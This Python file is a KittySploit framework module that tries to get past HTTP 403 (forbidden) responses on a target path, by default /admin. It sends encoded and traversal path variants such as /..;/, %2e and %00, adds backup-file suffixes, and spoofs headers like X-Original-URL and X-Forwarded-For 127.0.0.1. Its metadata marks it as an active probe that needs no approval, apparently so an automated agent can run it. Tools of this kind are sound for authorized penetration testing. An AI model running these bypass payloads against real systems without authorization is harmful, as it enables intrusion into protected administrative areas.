#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.bypass_confirm import is_confirmed_bypass
import os


class Module(Auxiliary, Http_client):

    __info__ = {
        'name': '403 bypass tester',
        'description': (
            "Try to bypass 403 (forbidden) on a web resource. Homepage collapses "
            "(e.g. /admin/../, ignored rewrite headers) are filtered out."
        ),
        'author': 'KittySploit Team',
        'tags': ['web', 'scanner', 'bypass', '403'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 12,
            'reversible': True,
            'approval_required': False,
            'produces': ['risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 0.8,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'endpoints', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
    }

    path = OptString("/admin", "Chemin ou ressource à tester", required=True)
    extra_wordlist = OptFile("", "File with additional paths (one per line)", required=False, advanced=True)
    compare_soft403 = OptBool(True, "Compare the body with the reference 403 response", required=False, advanced=True)

    def check(self):
        """Vérifie que la cible est joignable."""
        try:
            resp = self.http_request(method="GET", path="/", allow_redirects=False)
            if resp and resp.status_code in [200, 301, 302, 401, 403, 404]:
                return True
            print_error("The target is not reachable.")
            return False
        except Exception as e:
            print_error(f"Error during check: {e}")
            return False

    def _normalize_path(self, path_str):
        path_str = path_str.strip()
        if not path_str.startswith("/"):
            path_str = f"/{path_str}"
        return path_str

    def _load_extra_paths(self):
        if not self.extra_wordlist:
            return []
        if not os.path.isfile(self.extra_wordlist):
            print_warning(f"Wordlist not found: {self.extra_wordlist}")
            return []
        extra = []
        try:
            with open(self.extra_wordlist, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        extra.append(self._normalize_path(line))
        except Exception as e:
            print_warning(f"Unable to read wordlist: {e}")
        return extra

    def _base_variations(self, base_path):
        clean = self._normalize_path(base_path.rstrip("/")) if base_path != "/" else "/"
        encoded = clean.replace("/", "%2f")

        suffixes = [".", ".json", ".html", ".php", ".bak", ".old", "~"]
        injections = [
            "",
            "/",
            "/.",
            "/%2e/",
            "%2e",
            "%2f",
            "%2f/",
            "%20",
            "%09",
            "%00",
            ";;/",
            "/..;/",
            "/.;/",
            "/./",
            "/../",
            "//",
            "/?",
            "/?bypass=1",
            "/#",
        ]

        variants = []
        for inj in injections:
            variants.append((f"path:{inj or 'base'}", f"{clean}{inj}", None))

        for suffix in suffixes:
            variants.append((f"suffix:{suffix}", f"{clean}{suffix}", None))

        variants.append(("double_slash_prefix", f"//{clean.lstrip('/')}", None))
        variants.append(("dot_prefix", f"/./{clean.lstrip('/')}", None))
        variants.append(("encoded_path", encoded, None))
        variants.append(("upper_case", clean.upper(), None))
        variants.append(("lower_case", clean.lower(), None))

        header_variants = [
            ("x-original-url", "/", {"X-Original-URL": clean}),
            ("x-rewrite-url", "/", {"X-Rewrite-URL": clean}),
            ("x-forwarded-for", clean, {"X-Forwarded-For": "127.0.0.1"}),
            ("x-forwarded-host", clean, {"X-Forwarded-Host": "127.0.0.1"}),
            ("x-client-ip", clean, {"X-Client-IP": "127.0.0.1"}),
            ("referer-root", clean, {"Referer": "/"}),
        ]
        variants.extend(header_variants)

        return variants

    def _response_signature(self, response):
        if response is None:
            return None
        body = response.text or ""
        return {
            "status": response.status_code,
            "length": len(body),
            "content_type": response.headers.get("Content-Type", ""),
        }

    def _fetch(self, path, headers=None):
        try:
            return self.http_request(
                method="GET",
                path=path,
                headers=headers or {},
                allow_redirects=False,
            )
        except Exception as e:
            print_debug(f"Request failed for {path}: {e}")
            return None

    def run(self):
        print_status(f"Target: {self.target}:{self.port} | Test the path {self.path}")
        target_path = self._normalize_path(str(self.path or "/admin"))

        home_sig = self._response_signature(self._fetch("/"))
        baseline_resp = self._fetch(target_path)
        baseline_sig = self._response_signature(baseline_resp)
        if baseline_sig:
            print_info(
                f"Reference response: status={baseline_sig['status']} len={baseline_sig['length']}"
            )
        else:
            print_warning("Unable to get a reference response, the differences will be less reliable.")
        if home_sig:
            print_info(f"Homepage control: status={home_sig['status']} len={home_sig['length']}")

        if baseline_sig and int(baseline_sig.get("status") or 0) != 403:
            print_warning(
                f"Path {target_path} is not 403 (got {baseline_sig.get('status')}); "
                "bypass results may be less meaningful."
            )

        variants = self._base_variations(target_path)
        for extra in self._load_extra_paths():
            variants.append((f"extra:{extra}", extra, None))

        seen = set()
        filtered = []
        for name, path, headers in variants:
            key = (path, frozenset((headers or {}).items()))
            if key in seen:
                continue
            seen.add(key)
            filtered.append((name, path, headers))

        findings = []
        confirmed = 0
        for name, path, headers in filtered:
            resp = self._fetch(path, headers=headers)
            sig = self._response_signature(resp)
            interesting = False
            if sig and self.compare_soft403:
                interesting = is_confirmed_bypass(
                    sig,
                    blocked_sig=baseline_sig,
                    home_sig=home_sig,
                    name=name,
                    path=path,
                    target_path=target_path,
                    blocked_status=403,
                )
            elif sig and not self.compare_soft403:
                interesting = sig["status"] not in {403, 400, 404}
            if sig:
                note = "yes" if interesting else "no"
                findings.append([name, path, sig['status'], sig['length'], note])
                if interesting:
                    confirmed += 1
                    print_success(
                        f"[{name}] Confirmed bypass candidate: {path} -> "
                        f"{sig['status']} (len={sig['length']})"
                    )
            else:
                findings.append([name, path, "err", 0, "no"])

        print_table(['Test', 'Path', 'Code', 'Size', 'Diff?'], findings)
        if confirmed:
            print_success(f"Confirmed bypass candidates: {confirmed}")
        else:
            print_info("No confirmed 403 bypass (homepage collapses / errors filtered out).")
        return True


